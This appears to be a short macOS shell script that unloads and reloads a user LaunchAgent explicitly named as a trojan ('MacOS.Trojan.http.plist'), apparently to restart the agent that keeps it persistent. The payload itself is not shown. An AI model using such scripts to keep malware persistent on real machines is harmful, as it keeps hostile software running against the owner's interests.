#!/bin/sh

launchctl unload "$HOME/Library/LaunchAgents/MacOS.Trojan.http.plist"
launchctl load "$HOME/Library/LaunchAgents/MacOS.Trojan.http.plist"
